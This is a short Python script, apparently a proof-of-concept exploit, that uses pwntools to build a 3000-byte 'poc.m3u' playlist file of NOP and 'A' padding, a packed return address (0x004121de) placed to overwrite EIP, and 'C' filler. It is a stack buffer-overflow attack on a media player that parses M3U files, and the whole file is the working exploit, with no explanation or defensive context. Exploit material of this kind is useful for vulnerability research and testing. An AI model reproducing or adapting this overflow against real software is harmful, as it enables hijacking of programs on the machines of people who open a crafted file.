import pwn

filename = "poc.m3u"
A_padding=b"\x90"*10+b"A"*211
eip=pwn.p32(0x004121de)
C_padding=b"C"*(3000-len(A_padding)-len(eip))
evilString =A_padding+eip+C_padding
file = open(filename,'wb')
file.write(evilString)
file.close()